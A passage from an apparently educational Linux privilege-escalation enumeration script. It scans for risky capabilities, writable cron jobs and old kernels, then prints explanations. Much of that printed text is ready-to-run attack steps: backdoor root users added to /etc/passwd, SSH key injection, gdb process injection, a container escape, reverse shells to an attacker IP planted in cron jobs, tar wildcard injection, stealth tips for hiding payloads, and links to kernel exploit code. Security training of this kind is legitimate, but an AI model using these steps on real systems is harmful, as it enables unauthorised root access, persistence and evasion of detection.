            teach "EXPLOITATION STRATEGIES:"
            teach ""
            teach "  Option 1 - Add root user to /etc/passwd:"
            teach "    Generate hash: openssl passwd -1 -salt xyz password123"
            teach "    echo 'hacker:\$1\$xyz\$HASH:0:0::/root:/bin/bash' | $binary tee -a /etc/passwd"
            teach "    su hacker"
            teach ""
            teach "  Option 2 - Remove root password from /etc/shadow:"
            teach "    Use $basename to edit /etc/shadow"
            teach "    Change: root:\$6\$long_hash:... → root::..."
            teach "    su root (no password needed)"
            teach ""
            teach "  Option 3 - Inject SSH key:"
            teach "    echo 'YOUR_PUBLIC_KEY' | $binary tee -a /root/.ssh/authorized_keys"
            teach "    ssh -i your_private_key root@localhost"
            log ""
        fi
        
        # === cap_sys_ptrace - Debug Processes ===
        if echo "$caps" | grep -q "cap_sys_ptrace"; then
            warn "CAP_SYS_PTRACE found: $binary"
            log ""
            teach "╔═══════════════════════════════════════════════════════════╗"
            teach "║  CAP_SYS_PTRACE - Debug and Inject Into Processes"
            teach "╚═══════════════════════════════════════════════════════════"
            teach ""
            teach "WHAT IT IS:"
            teach "  ptrace() is the system call debuggers use to inspect/control"
            teach "  other processes. cap_sys_ptrace lets you debug ANY process,"
            teach "  including those owned by root."
            teach ""
            teach "EXPLOITATION:"
            teach "  1. Find root process: ps aux | grep root"
            teach "  2. Attach with gdb: gdb -p <PID>"
            teach "  3. Inject commands:"
            teach "     (gdb) call (int)system(\"chmod u+s /bin/bash\")"
            teach "  4. Detach: (gdb) detach"
            teach "  5. Execute SUID bash: /bin/bash -p"
            log ""
        fi
        
        # === cap_sys_admin - God Mode ===
        if echo "$caps" | grep -q "cap_sys_admin"; then
            critical "CAP_SYS_ADMIN on $binary - Nearly equivalent to root"
            vuln "CAP_SYS_ADMIN found: $binary"
            log ""
            teach "╔═══════════════════════════════════════════════════════════╗"
            teach "║  CAP_SYS_ADMIN - The 'God Mode' Capability"
            teach "╚═══════════════════════════════════════════════════════════"
            teach ""
            teach "WHAT IT IS:"
            teach "  cap_sys_admin is a catch-all for 'system administration' tasks."
            teach "  It's extremely broad and provides many root-equivalent powers."
            teach "  Often called 'the new root' because it's so powerful."
            teach ""
            teach "WHY IT'S SO BROAD:"
            teach "  Created as a catch-all for operations that 'need admin privileges'"
            teach "  but don't fit other capabilities. Over time, dozens of operations"
            teach "  got added to it. Now it's almost as powerful as full root."
            teach ""
            teach "CONCRETE EXAMPLE - Container Escape:"
            teach ""
            teach "  Scenario: You're in a Docker container with cap_sys_admin"
            teach "  "
            teach "  1. List host's block devices:"
            teach "     fdisk -l"
            teach "     (Shows /dev/sda1, /dev/vda1, etc.)"
            teach "  "
            teach "  2. Create mount point:"
            teach "     mkdir /mnt/host"
            teach "  "
            teach "  3. Mount host's root filesystem:"
            teach "     mount /dev/sda1 /mnt/host"
            teach "     (Normally blocked, but cap_sys_admin allows it)"
            teach "  "
            teach "  4. Chroot to host filesystem:"
            teach "     chroot /mnt/host /bin/bash"
            teach "  "
            teach "  5. You're now on the HOST system as root, escaped the container"
            teach ""
            teach "WHY THIS WORKS:"
            teach "  cap_sys_admin allows mounting filesystems (admin operation)."
            teach "  Containers share the host's devices (/dev/sda1 exists inside)."
            teach "  Once mounted, you can access the real host filesystem."
            teach "  Container isolation is broken - you're on the host now."
            teach ""
            teach "OTHER EXPLOITATION PATHS:"
            teach "  • Load malicious kernel module (if cap_sys_module also present)"
            teach "  • Manipulate /proc/sys to weaken security settings"
            teach "  • Create new namespaces with elevated privileges"
            teach "  • Perform quota operations to fill disk/DOS"
            log ""
        fi
        
        # === cap_sys_module - Load Kernel Modules ===
        if echo "$caps" | grep -q "cap_sys_module"; then
            critical "CAP_SYS_MODULE on $binary - Load kernel modules for root"
            vuln "CAP_SYS_MODULE found: $binary"
            log ""
            teach "EXPLOITATION:"
            teach "  Create malicious kernel module for root-level code execution"
            teach "  This requires kernel development knowledge"
            teach "  Kernel module runs in kernel space = complete system control"
            log ""
        fi
    done
    
    # === PHASE 5: SUMMARY ===
    log ""
    teach "═══════════════════════════════════════════════════════════"
    teach "CAPABILITIES - KEY TAKEAWAYS"
    teach "═══════════════════════════════════════════════════════════"
    teach ""
    teach "MENTAL MODEL FOR CAPABILITIES:"
    teach ""
    teach "  When you see a capability during enumeration, ask these questions:"
    teach ""
    teach "  1. What does this capability let me DO?"
    teach "     → Read files? Change UID? Mount filesystems? Network operations?"
    teach "  "
    teach "  2. Can I CONTROL what the binary does with that power?"
    teach "     → Python/Perl/Ruby = Full control (write any code)"
    teach "     → Compiled binary = Limited (must find exploitable behavior)"
    teach "     → Shell scripts = Full control if writable"
    teach "  "
    teach "  3. Does this binary EXECUTE other things I can influence?"
    teach "     → tar with cap_dac_override calls writable script = win"
    teach "     → systemd with caps might execute service files you can modify"
    teach ""
    teach "EXAMPLES:"
    teach "  cap_setuid on /usr/bin/python3:"
    teach "    1. What? Change user ID to anyone, including root"
    teach "    2. Control? YES - I can write Python code: os.setuid(0)"
    teach "    3. Execute? YES - Python executes my code"
    teach "    → INSTANT ROOT"
    teach ""
    teach "  cap_net_raw on /bin/ping:"
    teach "    1. What? Send raw network packets"
    teach "    2. Control? NO - ping is compiled, does one thing"
    teach "    3. Execute? NO - doesn't call other programs"
    teach "    → Not exploitable (this is the intended use case)"
    teach ""
    teach "THE BIG THREE FOR PRIVILEGE ESCALATION:"
    teach "  1. cap_setuid = Become root directly (if on interpreter)"
    teach "  2. cap_dac_override = Read/write any file (modify /etc/passwd)"
    teach "  3. cap_sys_admin = Mount filesystems, escape containers"
    teach ""
    teach "HOW TO CHECK CAPABILITIES:"
    teach "  getcap -r / 2>/dev/null"
    teach "  Focus on: interpreters (python, perl, ruby, php, node)"
    teach "           file utilities (tar, dd, rsync)"
    teach "           debug tools (gdb)"
    teach ""
    teach "WHY THIS MATTERS:"
    teach "  Capabilities are a security improvement over SUID root."
    teach "  But 'security improvement' ≠ 'secure'"
    teach "  One misconfigured capability = game over"
    teach "  Admins often don't understand the implications of capabilities"
    log ""
}
# === CRON JOB ANALYSIS ===
enum_cron() {
    section "CRON JOB ANALYSIS"
    
    # === PHASE 1: SILENT SCAN - Collect all findings first ===
    local found_issues=0
    local temp_writable_scripts="/tmp/.learnpeas_cron_scripts_$$"
    local temp_writable_dirs="/tmp/.learnpeas_cron_dirs_$$"
    local temp_wildcard_jobs="/tmp/.learnpeas_cron_wildcards_$$"
    local temp_writable_files="/tmp/.learnpeas_cron_files_$$"
    
    # Cleanup function
    cleanup_cron_temps() {
        rm -f "$temp_writable_scripts" "$temp_writable_dirs" "$temp_wildcard_jobs" "$temp_writable_files" 2>/dev/null
    }
    trap cleanup_cron_temps RETURN
    
    # Check system crontab
    if [ -r /etc/crontab ]; then
        while IFS= read -r line; do
            # Skip comments and empty lines
            echo "$line" | grep -qE "^#|^$" && continue
            
            # Extract script paths from the line
            local scripts=$(echo "$line" | grep -oE '/[^ ]+\.(sh|py|pl|rb|php|bash)')
            
            for script in $scripts; do
                if [ -n "$script" ] && [ -f "$script" ]; then
                    if [ -w "$script" ]; then
                        echo "$script|$line" >> "$temp_writable_scripts"
                        found_issues=1
                    elif [ -d "$(dirname "$script")" ] && [ -w "$(dirname "$script")" ]; then
                        echo "$script|$line|$(dirname "$script")" >> "$temp_writable_dirs"
                        found_issues=1
                    fi
                fi
            done
            
            # Check for wildcards (exclude safe run-parts and common false positives)
            if echo "$line" | grep -qE '\*' && ! echo "$line" | grep -qE 'run-parts|logrotate|/\* \* \* \*'; then
                # Only flag if wildcard is used in command context, not in schedule
                if echo "$line" | awk '{print $6,$7,$8,$9,$10}' | grep -q '\*'; then
                    echo "$line" >> "$temp_wildcard_jobs"
                    found_issues=1
                fi
            fi
        done < <(grep -v "^#" /etc/crontab 2>/dev/null | grep -v "^$")
    fi
    
    # Check cron directories for writable files and directories
    for dir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
        if [ -w "$dir" ]; then
            echo "$dir|directory" >> "$temp_writable_files"
            found_issues=1
        fi
        
        if [ -d "$dir" ]; then
            while IFS= read -r file; do
                if [ -w "$file" ]; then
                    echo "$file|file" >> "$temp_writable_files"
                    found_issues=1
                fi
            done < <(find "$dir" -type f 2>/dev/null)
        fi
    done
    
    # Check user crontabs (if accessible)
    if [ -d /var/spool/cron/crontabs ]; then
        while IFS= read -r cronfile; do
            [ ! -r "$cronfile" ] && continue
            
            while IFS= read -r line; do
                echo "$line" | grep -qE "^#|^$" && continue
                
                local scripts=$(echo "$line" | grep -oE '/[^ ]+\.(sh|py|pl|rb|php|bash)')
                for script in $scripts; do
                    if [ -w "$script" ]; then
                        echo "$script|$line|$(basename "$cronfile")" >> "$temp_writable_scripts"
                        found_issues=1
                    fi
                done
            done < <(grep -v "^#" "$cronfile" 2>/dev/null | grep -v "^$")
        done < <(find /var/spool/cron/crontabs -type f 2>/dev/null)
    fi
    
    # === PHASE 2: CONDITIONAL EDUCATION (only if issues found) ===
    if [ $found_issues -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  CRON EXPLOITATION - Understanding Scheduled Tasks"
        teach "╚═══════════════════════════════════════════════════════════"
        teach ""
        teach "HOW CRON WORKS:"
        teach "  Cron daemon (crond) runs as root, checking schedules every minute"
        teach "  Reads: /etc/crontab, /etc/cron.d/*, user crontabs"
        teach "  Executes commands at scheduled times as specified user"
        teach ""
        teach "TYPICAL CRON ENTRY:"
        teach "  */5 * * * * root /usr/local/bin/backup.sh"
        teach "  │   │ │ │ │  │    └─ Command to execute"
        teach "  │   │ │ │ │  └─ User to run as (root = danger!)"
        teach "  └───┴─┴─┴─┴─ Schedule (* = every)"
        teach "  min hr dom mon dow"
        teach ""
        teach "WHY ADMINS CREATE VULNERABILITIES:"
        teach ""
        teach "  Scenario 1 - The Quick Fix:"
        teach "    Admin needs automated backup script"
        teach "    Creates /usr/local/bin/backup.sh with 755 permissions"
        teach "    Adds to root's crontab"
        teach "    Thinks: 'Only root runs it, so it's safe'"
        teach "    Reality: File is world-writable or in writable directory"
        teach "    → You modify script, cron runs YOUR code as root"
        teach ""
        teach "  Scenario 2 - The Wildcard Mistake:"
        teach "    Admin writes: tar -czf backup.tar.gz /data/*"
        teach "    Thinks: '* means all files in /data'"
        teach "    Reality: Shell expands * to filenames BEFORE tar runs"
        teach "    → You create files named '--checkpoint-action=exec=shell.sh'"
        teach "    → Tar interprets these as arguments, executes your code"
        teach ""
        teach "THE TIMING WINDOW:"
        teach "  Cron runs every minute"
        teach "  You inject payload → Wait up to 60 seconds → Root shell"
        teach "  Some jobs run every 5 minutes, hourly, or daily"
        teach "  Check the schedule field to know when it'll trigger"
        teach ""
        teach "EXPLOITATION PATHS:"
        teach "  1. Writable script → Inject malicious commands"
        teach "  2. Writable directory → Replace script with yours"
        teach "  3. Wildcard injection → Create malicious filenames"
        teach "  4. Writable cron config → Create new scheduled jobs"
        log ""
    fi
    
    # === PHASE 3: REPORT WRITABLE SCRIPTS ===
    if [ -f "$temp_writable_scripts" ]; then
        while IFS='|' read -r script job user; do
            critical "WRITABLE cron script: $script"
            vuln "Cron job: $job"
            if [ -n "$user" ]; then
                info "User crontab: $user"
            fi
            log ""
            teach "╔═══════════════════════════════════════════════════════════╗"
            teach "║  WRITABLE SCRIPT EXPLOITATION"
            teach "╚═══════════════════════════════════════════════════════════"
            teach ""
            teach "WHAT YOU CONTROL:"
            teach "  The script file itself is writable by you"
            teach "  Cron will execute whatever code you put in it as root"
            teach "  This is instant root access on next execution"
            teach ""
            teach "EXPLOITATION OPTIONS:"
            teach ""
            teach "  Method 1 - SUID Shell (Stealthy):"
            teach "    echo 'chmod u+s /bin/bash' >> $script"
            teach "    # Wait for cron to run (check schedule in crontab)"
            teach "    /bin/bash -p  # You now have root shell"
            teach ""
            teach "  Method 2 - Reverse Shell (Immediate notification):"
            teach "    echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> $script"
            teach "    # On attacker machine: nc -lvnp 4444"
            teach "    # Wait for cron execution"
            teach ""
            teach "  Method 3 - SSH Key Injection (Persistent access):"
            teach "    cat >> $script << 'EOF'"
            teach "    mkdir -p /root/.ssh"
            teach "    echo 'YOUR_PUBLIC_KEY' >> /root/.ssh/authorized_keys"
            teach "    chmod 700 /root/.ssh"
            teach "    chmod 600 /root/.ssh/authorized_keys"
            teach "    EOF"
            teach "    # After cron runs: ssh -i your_key root@target"
            teach ""
            teach "  Method 4 - Add Backdoor User:"
            teach "    # Generate password hash: openssl passwd -1 -salt xyz password123"
            teach "    echo 'echo \"backdoor:\$1\$xyz\$HASH:0:0::/root:/bin/bash\" >> /etc/passwd' >> $script"
            teach "    # After cron: su backdoor"
            teach ""
            teach "STEALTH CONSIDERATIONS:"
            teach "  • Append (>>) instead of overwrite (>) to keep original functionality"
            teach "  • Check script file size before/after to avoid suspicion"
            teach "  • Remove your payload after execution: echo 'sed -i \"/YOUR_LINE/d\" $script' >> $script"
            teach "  • Some scripts have checksums - check for integrity monitoring"
            log ""
        done < "$temp_writable_scripts"
    fi
    
    # === PHASE 4: REPORT WRITABLE DIRECTORIES ===
    if [ -f "$temp_writable_dirs" ]; then
        while IFS='|' read -r script job dir; do
            critical "Cron script in WRITABLE directory: $dir"
            vuln "Script: $script"
            vuln "Cron job: $job"
            log ""
            teach "╔═══════════════════════════════════════════════════════════╗"
            teach "║  WRITABLE DIRECTORY EXPLOITATION"
            teach "╚═══════════════════════════════════════════════════════════"
            teach ""
            teach "WHAT YOU CONTROL:"
            teach "  The directory containing the script is writable"
            teach "  You can delete the script and replace it with yours"
            teach "  Or create a symlink to your malicious script"
            teach ""
            teach "WHY THIS WORKS:"
            teach "  Cron doesn't verify script integrity, only that path exists"
            teach "  Directory write permission = full control over that path"
            teach ""
            teach "EXPLOITATION:"
            teach ""
            teach "  Step 1 - Backup original (optional, for stealth):"
            teach "    cp $script ${script}.bak"
            teach ""
            teach "  Step 2 - Replace with malicious script:"
            teach "    cat > $script << 'EOF'"
            teach "    #!/bin/bash"
            teach "    chmod u+s /bin/bash"
            teach "    # Optional: Call original to avoid suspicion"
            teach "    # ${script}.bak \"\$@\""
            teach "    EOF"
            teach ""
            teach "  Step 3 - Ensure executable:"
            teach "    chmod +x $script"
            teach ""
            teach "  Step 4 - Wait for cron execution"
            teach "    Check crontab for schedule (*/5 = every 5 min)"
            teach ""
            teach "  Step 5 - Execute SUID bash:"
            teach "    /bin/bash -p"
            teach ""
            teach "ALTERNATIVE - Symlink Method:"
            teach "  mv $script ${script}.real"
            teach "  ln -s /path/to/your/evil/script $script"
            teach "  # Cron follows symlink, executes your script as root"
            log ""
        done < "$temp_writable_dirs"
    fi
    
    # === PHASE 5: REPORT WILDCARD JOBS ===
    if [ -f "$temp_wildcard_jobs" ]; then
        warn "Cron jobs using wildcards detected"
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  WILDCARD INJECTION - Advanced Technique"
        teach "╚═══════════════════════════════════════════════════════════"
        teach ""
        teach "HOW WILDCARD EXPANSION WORKS:"
        teach ""
        teach "  Shell processes wildcards BEFORE passing to command"
        teach ""
        teach "  Example cron job:"
        teach "    tar -czf backup.tar.gz /data/*"
        teach ""
        teach "  Files in /data/:"
        teach "    file1.txt"
        teach "    file2.txt"
        teach ""
        teach "  Shell expands to:"
        teach "    tar -czf backup.tar.gz /data/file1.txt /data/file2.txt"
        teach ""
        teach "THE ATTACK:"
        teach ""
        teach "  You create files with names that look like command flags:"
        teach "    cd /data"
        teach "    touch -- '--checkpoint=1'"
        teach "    touch -- '--checkpoint-action=exec=sh shell.sh'"
        teach ""
        teach "  Now shell expands to:"
        teach "    tar -czf backup.tar.gz /data/--checkpoint=1 /data/--checkpoint-action=exec=sh shell.sh /data/file1.txt"
        teach ""
        teach "  Tar interprets '--checkpoint-action' as an OPTION, not a filename!"
        teach "  Tar's --checkpoint-action flag executes shell commands"
        teach "  Result: Tar executes shell.sh as root"
        teach ""
        teach "WHY THIS WORKS:"
        teach "  Commands process options (flags starting with -) before filenames"
        teach "  There's no way for tar to distinguish between:"
        teach "    - A file named '--checkpoint=1'"
        teach "    - An actual --checkpoint=1 flag"
        teach "  Shell has already expanded * by the time tar runs"
        teach ""
        
        while IFS= read -r job; do
            vuln "Wildcard job: $job"
        done < "$temp_wildcard_jobs"
        
        log ""
        teach "EXPLOITATION STEPS:"
        teach ""
        teach "  1. Identify the working directory from cron job"
        teach "     (Look at the path before the *)"
        teach ""
        teach "  2. Create your malicious payload script:"
        teach "     cat > /tmp/shell.sh << 'EOF'"
        teach "     #!/bin/bash"
        teach "     chmod u+s /bin/bash"
        teach "     EOF"
        teach "     chmod +x /tmp/shell.sh"
        teach ""
        teach "  3. Navigate to wildcard directory:"
        teach "     cd /target/directory"
        teach ""
        teach "  4. Create checkpoint files (note the -- to prevent flag interpretation):"
        teach "     touch -- '--checkpoint=1'"
        teach "     touch -- '--checkpoint-action=exec=sh /tmp/shell.sh'"
        teach ""
        teach "  5. Wait for cron to run"
        teach ""
        teach "  6. Execute SUID bash:"
        teach "     /bin/bash -p"
        teach ""
        teach "OTHER VULNERABLE COMMANDS:"
        teach "  • rsync with *: Use -e flag"
        teach "    touch -- '-e sh shell.sh x'"
        teach ""
        teach "  • chown with *: Use --reference flag"
        teach "    touch -- '--reference=/root/owned_file'"
        teach ""
        teach "  • chmod with *: Use --reference flag"
        teach ""
        teach "KEY INSIGHT:"
        teach "  Any command that accepts flags starting with - or --"
        teach "  and processes * wildcards is potentially vulnerable"
        log ""
    fi
    
    # === PHASE 6: REPORT WRITABLE CRON FILES ===
    if [ -f "$temp_writable_files" ]; then
        while IFS='|' read -r file type; do
            critical "WRITABLE cron configuration: $file"
            vuln "Type: $type"
            log ""
            teach "╔═══════════════════════════════════════════════════════════╗"
            teach "║  WRITABLE CRON CONFIGURATION"
            teach "╚═══════════════════════════════════════════════════════════"
            teach ""
            teach "DIRECT CRON JOB CREATION:"
            teach "  You can create or modify cron jobs directly"
            teach "  This is the easiest path - no script analysis needed"
            teach ""
            teach "EXPLOITATION:"
            teach ""
            if [ "$type" = "directory" ]; then
                teach "  Directory is writable - create new cron file:"
                teach "    echo '* * * * * root chmod u+s /bin/bash' > $file/pwn"
                teach "    # Runs every minute"
                teach "    # Wait up to 60 seconds"
                teach "    /bin/bash -p"
            else
                teach "  File is writable - add job directly:"
                teach "    echo '* * * * * root chmod u+s /bin/bash' >> $file"
                teach "    # Runs every minute"
                teach "    # Wait up to 60 seconds"  
                teach "    /bin/bash -p"
            fi
            teach ""
            teach "ALTERNATIVE PAYLOADS:"
            teach ""
            teach "  Reverse shell:"
            teach "    echo '* * * * * root bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' > $file"
            teach ""
            teach "  SSH key injection:"
            teach "    echo '* * * * * root echo YOUR_KEY >> /root/.ssh/authorized_keys' > $file"
            teach ""
            teach "  Add backdoor user:"
            teach "    echo '* * * * * root echo \"pwn:\\$1\\$xyz\\$HASH:0:0::/root:/bin/bash\" >> /etc/passwd' > $file"
            log ""
        done < "$temp_writable_files"
    fi
    
    # === PHASE 7: CLEAN EXIT ===
    if [ $found_issues -eq 0 ]; then
        ok "No exploitable cron configurations found"
    fi
}

# === KERNEL EXPLOITS ===
# === KERNEL EXPLOIT DETECTION ===
enum_kernel() {
    section "KERNEL EXPLOIT DETECTION"
    
    explain_concept "Kernel Exploits" \
        "The kernel is the core of Linux, managing hardware, processes, and security. Vulnerabilities here affect all users and often give instant root." \
        "The kernel has complete control over the system - it manages memory, processes, hardware, and enforces all security. It runs in 'ring 0' (highest privilege). Any code execution in kernel space = total system control. Unlike user-space exploits (SUID, sudo), kernel exploits work regardless of user permissions." \
        "Why kernel exploits are powerful:\n  • Bypass ALL security mechanisms (capabilities, AppArmor, SELinux)\n  • Affect ALL users on the system\n  • Escape containers (containers share host kernel)\n  • No authentication needed\n  • Universal - same exploit works across distributions\n\nWhy they exist:\n  • Kernel is millions of lines of C code\n  • Handles complex low-level operations\n  • Must support ancient hardware/features\n  • Race conditions in multi-threading\n  • Memory corruption bugs"
    
    local kernel=$(uname -r)
    local kernel_version=$(echo "$kernel" | grep -oE '^[0-9]+\.[0-9]+\.[0-9]+')
    
    info "Kernel version: $kernel"
    info "Kernel numeric version: $kernel_version"
    log ""
    
    # Parse version for comparison
    local major=$(echo "$kernel_version" | cut -d. -f1)
    local minor=$(echo "$kernel_version" | cut -d. -f2)
    local patch=$(echo "$kernel_version" | cut -d. -f3)
    
    info "Checking kernel against known exploitable vulnerabilities..."
    log ""
    
    # === Dirty Pipe (CVE-2022-0847) ===
    if [ "$major" -eq 5 ] && [ "$minor" -ge 8 ] && [ "$minor" -le 16 ]; then
        critical "Kernel vulnerable to Dirty Pipe (CVE-2022-0847) - Instant root"
        vuln "Potentially vulnerable to Dirty Pipe (CVE-2022-0847)"
        log ""
        teach "╔════════════════════════════════════════════════════════════╗"
        teach "║  CVE-2022-0847 - Dirty Pipe (Arbitrary File Overwrite)"
        teach "╚════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT IT IS:"
        teach "  A vulnerability that allows overwriting data in read-only files"
        teach "  by exploiting how Linux handles pipe buffers. Named after the"
        teach "  similar 'Dirty COW' vulnerability from 2016."
        teach ""
        teach "WHY IT EXISTS:"
        teach "  Linux uses 'pipes' to pass data between processes (like |)."
        teach "  Pipes use special memory buffers called 'pipe buffers'."
        teach "  These buffers have flags to track their state."
        teach ""
        teach "THE BUG:"
        teach "  When merging pipe buffers, the kernel forgot to clear the"
        teach "  PIPE_BUF_FLAG_CAN_MERGE flag. This flag should be cleared"
        teach "  when data is copied into a page cache (file cache in memory)."
        teach ""
        teach "  The exploit works like this:"
        teach "  1. Open a read-only file (like /etc/passwd)"
        teach "  2. Create a pipe"
        teach "  3. Write data to the pipe that you want to inject"
        teach "  4. Splice the pipe into the target file"
        teach "  5. Because the flag wasn't cleared, kernel allows the write"
        teach "  6. You've now modified a read-only file!"
        teach ""
        teach "REAL-WORLD EXAMPLE:"
        teach "  Target: /etc/passwd (read-only, owned by root)"
        teach "  Action: Add a new root user without password"
        teach "  Result: Instant root access"
        teach ""
        teach "HOW TO EXPLOIT:"
        teach "  1. Check if vulnerable:"
        teach "     uname -r (kernel 5.8 - 5.16.11 = vulnerable)"
        teach "  2. Download exploit:"
        teach "     https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits"
        teach "  3. Compile:"
        teach "     gcc exploit-1.c -o exploit"
        teach "  4. Run:"
        teach "     ./exploit"
        teach "  5. The exploit will:"
        teach "     - Overwrite /etc/passwd to add user 'aaron' with no password"
        teach "     - Or make /bin/bash SUID for instant root"
        teach ""
        teach "WHY IT'S CALLED DIRTY PIPE:"
        teach "  • 'Dirty' = Modifying read-only data (like Dirty COW)"
        teach "  • 'Pipe' = Exploits Linux pipe mechanism"
        teach ""
        teach "AFFECTED SYSTEMS:"
        teach "  Kernels: 5.8 - 5.16.11, 5.15.25, 5.10.102"
        teach "  Most Linux distributions from 2020-2022"
        teach ""
        teach "IMPACT: Any user can overwrite any file → Root access"
        log ""
    fi
    
    # === nf_tables (CVE-2024-1086) ===
    if [ "$major" -eq 5 ] && [ "$minor" -ge 14 ] && [ "$minor" -le 18 ]; then
        vuln "Potentially vulnerable to nf_tables (CVE-2024-1086)"
        log ""
        teach "╔════════════════════════════════════════════════════════════╗"
        teach "║  CVE-2024-1086 - nf_tables Use-After-Free"
        teach "╚════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT IT IS:"
        teach "  A use-after-free vulnerability in the nftables (netfilter)"
        teach "  subsystem that allows local privilege escalation to root."
        teach ""
        teach "BACKGROUND - What is nftables:"
        teach "  nftables is Linux's firewall framework (successor to iptables)."
        teach "  It allows filtering network packets, managing firewall rules."
        teach "  Runs in kernel space for performance."
        teach ""
        teach "WHY IT EXISTS:"
        teach "  'Use-after-free' is a memory corruption bug. Here's what happens:"
        teach ""
        teach "  1. Kernel allocates memory for an nftables object"
        teach "  2. Kernel frees that memory (object deleted)"
        teach "  3. Kernel tries to use that memory again"
        teach "  4. But the memory might now contain attacker-controlled data"
        teach "  5. Kernel executes attacker's data = code execution as root"
        teach ""
        teach "SIMPLIFIED ANALOGY:"
        teach "  Imagine a library book:"
        teach "  1. You check out a book (allocate memory)"
        teach "  2. You return it (free memory)"
        teach "  3. Someone else checks it out and writes notes in it"
        teach "  4. You try to read your old notes (use-after-free)"
        teach "  5. But you're actually reading the new person's notes!"
        teach ""
        teach "TECHNICAL DETAILS:"
        teach "  The vulnerability is in how nftables handles anonymous sets."
        teach "  When deleting rules, the kernel frees memory but doesn't"
        teach "  clear all references to it. Attacker can trigger reuse of"
        teach "  that freed memory, overwriting kernel data structures."
        teach ""
        teach "REQUIREMENTS:"
        teach "  • CONFIG_USER_NS=y (user namespaces enabled)"
        teach "  • nftables support compiled in kernel"
        teach ""
        teach "HOW TO CHECK IF EXPLOITABLE:"
        teach "  1. Check kernel config:"
        teach "     grep CONFIG_USER_NS /boot/config-\$(uname -r)"
        teach "  2. If =y, likely vulnerable"
        teach ""
        teach "HOW TO EXPLOIT:"
        teach "  1. Check if vulnerable: uname -r (5.14-5.18)"
        teach "  2. Download exploit:"
        teach "     https://github.com/Notselwyn/CVE-2024-1086"
        teach "  3. Compile (requires kernel headers):"
        teach "     gcc exploit.c -o exploit"
        teach "  4. Run:"
        teach "     ./exploit"
        teach ""
        teach "WHY IT'S COMPLEX:"
        teach "  This is an advanced exploit requiring:"
        teach "  • Understanding of kernel memory management"
        teach "  • Heap manipulation (kernel heap spray)"
        teach "  • Timing-dependent (race condition)"
        teach ""
        teach "IMPACT: Local privilege escalation, works in containers"
        log ""
    fi
    
    # === DirtyCOW (CVE-2016-5195) ===
    if [ "$major" -eq 4 ]; then
        vuln "Kernel 4.x - Multiple known exploits available"
        teach "Older kernel - check exploit-db for specific version"
        log ""
        
        if [ "$minor" -le 10 ]; then
            critical "Kernel vulnerable to DirtyCOW (CVE-2016-5195) - Instant root"
            vuln "Potentially vulnerable to DirtyCOW (CVE-2016-5195)"
            log ""
            teach "╔════════════════════════════════════════════════════════════╗"
            teach "║  CVE-2016-5195 - Dirty COW (Copy-On-Write Race Condition)"
            teach "╚════════════════════════════════════════════════════════════╝"
            teach ""
            teach "WHAT IT IS:"
            teach "  One of the most famous Linux kernel vulnerabilities ever found."
            teach "  Allows writing to read-only files by exploiting a race condition"
            teach "  in the Copy-On-Write (COW) mechanism. Existed for 9+ years."
            teach ""
            teach "BACKGROUND - What is Copy-On-Write:"
            teach "  When you fork() a process, Linux doesn't immediately copy all"
            teach "  memory. Instead, parent and child share the same memory pages"
            teach "  marked as read-only. Only when one tries to write, the kernel"
            teach "  makes a copy. This saves memory and improves performance."
            teach ""
            teach "WHY IT EXISTS (The Race Condition):"
            teach "  There's a tiny time window between when the kernel:"
            teach "  1. Checks if you can write to a page (permission check)"
            teach "  2. Actually performs the write operation"
            teach ""
            teach "  The exploit abuses this timing gap:"
            teach "  Thread 1: Repeatedly calls madvise() to discard the page"
            teach "  Thread 2: Repeatedly tries to write to the read-only file"
            teach ""
            teach "  If timed perfectly:"
            teach "  • Thread 1 discards the COW page"
            teach "  • Thread 2 writes during the tiny gap"
            teach "  • Kernel writes to the ORIGINAL page (not the copy)"
            teach "  • You've just modified a read-only file!"
            teach ""
            teach "WHY IT'S CALLED DIRTY COW:"
            teach "  • 'Dirty' = Modified pages in memory"
            teach "  • 'COW' = Copy-On-Write mechanism"
            teach "  • Also a fun name that went viral"
            teach ""
            teach "THE EXPLOIT PROCESS:"
            teach "  1. Open /etc/passwd (read-only)"
            teach "  2. Map it into memory with mmap()"
            teach "  3. Start two threads racing:"
            teach "     - One calling madvise(MADV_DONTNEED) repeatedly"
            teach "     - One writing to the memory repeatedly"
            teach "  4. Race condition succeeds"
            teach "  5. Your write goes to the real file"
            teach "  6. Add root user or overwrite existing user's password hash"
            teach ""
            teach "HOW TO EXPLOIT:"
            teach "  1. Check vulnerability: uname -r (< 4.8.3 = vulnerable)"
            teach "  2. Download exploit:"
            teach "     https://github.com/dirtycow/dirtycow.github.io"
            teach "     https://github.com/firefart/dirtycow"
            teach "  3. Compile:"
            teach "     gcc -pthread dirty.c -o dirty -lcrypt"
            teach "  4. Run:"
            teach "     ./dirty mypassword"
            teach "  5. Creates user 'firefart' with UID 0 (root)"
            teach "  6. Login:"
            teach "     su firefart"
            teach "     Password: mypassword"
            teach ""
            teach "VARIATIONS:"
            teach "  • SUID binary injection (make /usr/bin/passwd writeable)"
            teach "  • Direct /etc/shadow modification"
            teach "  • SELinux/AppArmor policy modification"
            teach ""
            teach "WHY IT EXISTED SO LONG:"
            teach "  • Race conditions are hard to find"
            teach "  • The timing window is microseconds"
            teach "  • Required specific knowledge of kernel internals"
            teach "  • Copy-On-Write is a fundamental kernel feature"
            teach ""
            teach "IMPACT: Any user → Root, works on almost all Linux systems"
            teach "        Affected billions of devices (servers, Android, IoT)"
            log ""
        fi
    fi
    
    # === Kernel 3.x ===
    if [ "$major" -eq 3 ]; then
        critical "Kernel 3.x - ANCIENT kernel with many known exploits"
        vuln "Extremely outdated kernel - highly exploitable"
        log ""
        teach "╔════════════════════════════════════════════════════════════╗"
        teach "║  Kernel 3.x - Legacy Kernel (End of Life)"
        teach "╚════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT THIS MEANS:"
        teach "  Kernel 3.x was released 2011-2015 and is no longer maintained."
        teach "  It contains DOZENS of known privilege escalation vulnerabilities."
        teach ""
        teach "COMMON KERNEL 3.x EXPLOITS:"
        teach "  • DirtyCOW (CVE-2016-5195) - Already described above"
